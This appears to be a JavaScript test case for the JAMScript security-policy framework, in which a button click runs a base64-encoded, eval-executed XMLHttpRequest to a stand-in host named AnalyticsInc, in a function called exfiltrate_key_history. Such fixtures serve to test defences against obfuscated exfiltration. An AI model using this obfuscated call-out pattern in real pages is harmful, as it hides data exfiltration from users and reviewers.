function exfiltrate_key_history() {
  x = eval;
  var v0 = window.atob("eG1saHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeG1saHR0cC5vcGVuKCJHRVQiLCAiaHR0cDovL0FuYWx5dGljc0luYzo4MDAwL3N1Ym1pc3Npb24uaHRtbD90ZXN0PWVuY29kZV9ldmFsMSIsIHRydWUpOwp4bWxodHRwLnNlbmQobnVsbCk7");
  JAMScript.call(x, null, [v0]);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

